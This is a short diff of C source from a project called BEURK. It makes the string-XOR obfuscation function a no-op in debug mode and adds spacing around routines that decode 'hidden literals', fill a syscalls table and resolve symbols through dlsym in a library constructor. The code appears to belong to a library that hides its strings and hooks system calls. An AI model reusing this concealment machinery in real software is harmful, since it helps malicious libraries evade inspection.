@@ -18,25 +18,28 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-/** 
- *
-*/
-
 #include <string.h>
 #include <dlfcn.h>
 #include "beurk.h"
 
+
 /** xorify a string whith XOR_KEY
  * (XOR_KEY is a macro defined in BEURK config file
+ *
+ * NOTE: disabled on debug mode (as on builder)
  */
+#if DEBUG_LEVEL > 0
+# define xor(...)
+#else
 static void     xor(char *p) {
     unsigned int i;
 
     for(i = 0; i < strlen(p); i++) {
         p[i] ^= XOR_KEY;
     }
-    return p;
 }
+#endif
+
 
 /** re-xorify hidden literals.
  * hidden literals are all string literals used in the library
@@ -54,6 +57,7 @@ static void     init_hidden_literals(void) {
     }
 }
 
+
 /** re-xorify syscalls table.
  */
 static void     init_syscalls_table(void) {
@@ -63,6 +67,7 @@ static void     init_syscalls_table(void) {
         xor(beurk_syscalls_table[i]);
     }
 }
+
 
 /** initializes the global array beurk_syscalls_list
  * if dlsym fail, and DEBUG_MODE is activating, a error message
@@ -81,6 +86,7 @@ static void     init_syscalls_list() {
             DEBUG(dl_error);
     }
 }
+
 
 /** library constructor
  */
